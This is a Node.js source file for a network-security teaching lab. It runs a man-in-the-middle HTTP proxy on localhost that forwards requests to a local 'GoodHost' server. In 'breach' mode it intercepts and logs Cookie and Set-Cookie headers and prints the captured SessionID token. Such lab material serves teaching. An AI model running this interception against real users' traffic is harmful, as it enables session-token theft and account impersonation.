/**
 * MitM Proxy Server — Port 8080
 * Lab 5: Network Security & Man-in-the-Middle
 */

const http = require('http');

const PROXY_PORT  = 8080;
const TARGET_HOST = 'localhost';
const TARGET_PORT = 3000;

// ── CLI mode ──────────────────────────────────────────────────────────────────
const args    = process.argv.slice(2);
const modeArg = args.find(a => a.startsWith('--mode'));
const mode    = modeArg
  ? (modeArg.includes('=') ? modeArg.split('=')[1] : args[args.indexOf(modeArg) + 1])
  : 'normal';

console.log('');
console.log('╔══════════════════════════════════════════════════════╗');
console.log('║          MitM Proxy Server — Port 8080               ║');
console.log('╚══════════════════════════════════════════════════════╝');
console.log(`[Proxy] Mode   : ${mode.toUpperCase()}`);
console.log(`[Proxy] Listen : http://localhost:${PROXY_PORT}`);
console.log(`[Proxy] Target : http://${TARGET_HOST}:${TARGET_PORT}`);
if (mode === 'breach') {
  console.log('[Proxy] ⚠  BREACH MODE — Cookie headers will be intercepted and logged');
}
console.log('');

// ── Request counter for clean log formatting ──────────────────────────────────
let reqCount = 0;

// ── Main proxy handler ────────────────────────────────────────────────────────
const server = http.createServer((clientReq, clientRes) => {
  reqCount++;
  const reqId      = String(reqCount).padStart(4, '0');
  const cookieHdr  = clientReq.headers['cookie'] || '';
  const hasSession = cookieHdr.includes('SessionID');

  // ── BREACH: intercept and log every Cookie header ─────────────────────────
  if (mode === 'breach') {
    if (cookieHdr) {
      console.log(`\n[Proxy #${reqId}] ► ${clientReq.method} ${clientReq.url}`);
      console.log('[Proxy] ╔══════════════════════════════════════════════════════╗');
      console.log('[Proxy] ║       ★★★  COOKIE INTERCEPTED BY MitM PROXY  ★★★   ║');
      console.log('[Proxy] ╠══════════════════════════════════════════════════════╣');
      cookieHdr.split(';').map(s => s.trim()).filter(Boolean).forEach(part => {
        console.log(`[Proxy] ║  ${part.padEnd(52)} ║`);
      });
      console.log('[Proxy] ╚══════════════════════════════════════════════════════╝');
      if (hasSession) {
        const match = cookieHdr.match(/SessionID=([^;]+)/);
        console.log(`[Proxy] ★ SESSION TOKEN STOLEN → ${match ? match[1] : '(parse error)'}`);
        console.log('[Proxy] ★ An attacker could now impersonate this user with this token!');
      }
    } else {
      // Only log cookie-less requests occasionally to keep output clean
      if (clientReq.url === '/' || clientReq.url.startsWith('/api')) {
        console.log(`[Proxy #${reqId}] ► ${clientReq.method} ${clientReq.url}  ◌ no cookies`);
      }
    }
  } else {
    // Normal mode: minimal traffic log
    const tag = hasSession ? '  [🍪 session cookie present]' : '';
    console.log(`[Proxy #${reqId}] ► ${clientReq.method.padEnd(4)} ${clientReq.url}${tag}`);
  }

  // ── Forward the request to GoodHost (Port 3000) ───────────────────────────
  const options = {
    hostname: TARGET_HOST,
    port:     TARGET_PORT,
    path:     clientReq.url,
    method:   clientReq.method,
    headers:  { ...clientReq.headers, host: `${TARGET_HOST}:${TARGET_PORT}` },
  };

  const proxyReq = http.request(options, (proxyRes) => {
    // ── Log any Set-Cookie headers sent back from GoodHost ──────────────────
    const setCookie = proxyRes.headers['set-cookie'];
    if (setCookie && mode === 'breach') {
      console.log(`[Proxy] ↩ Set-Cookie INTERCEPTED from response to ${clientReq.url}:`);
      setCookie.forEach(c => console.log(`[Proxy]   ↳ ${c}`));
      console.log('[Proxy]   ^ In cookie-secure-httponly mode the Secure flag appears here.');
      console.log('[Proxy]   ^ Even so, the proxy has already seen the token in transit.\n');
    }

    // Relay status and headers back to the browser
    clientRes.writeHead(proxyRes.statusCode, proxyRes.headers);
    // Stream response body through
    proxyRes.pipe(clientRes, { end: true });
  });

  // ── Handle GoodHost being offline ─────────────────────────────────────────
  proxyReq.on('error', (err) => {
    console.error(`[Proxy] ✗ Could not reach GoodHost: ${err.message}`);
    if (!clientRes.headersSent) {
      clientRes.writeHead(502, { 'Content-Type': 'text/html; charset=utf-8' });
    }
    clientRes.end(`
      <html><body style="font-family:monospace;background:#0f1117;color:#e05555;padding:40px">
        <h2>502 Bad Gateway</h2>
        <p>The MitM Proxy could not reach GoodHost on port ${TARGET_PORT}.</p>
        <p>Make sure <code>goodhost/server.js</code> is running.</p>
        <pre style="color:#6b7394">Error: ${err.message}</pre>
      </body></html>
    `);
  });

  // Pipe the client's request body (e.g. POST /login) to GoodHost
  clientReq.pipe(proxyReq, { end: true });
});

server.listen(PROXY_PORT, () => {
  console.log(`[Proxy] Ready. Navigate your browser to http://localhost:${PROXY_PORT}\n`);
});
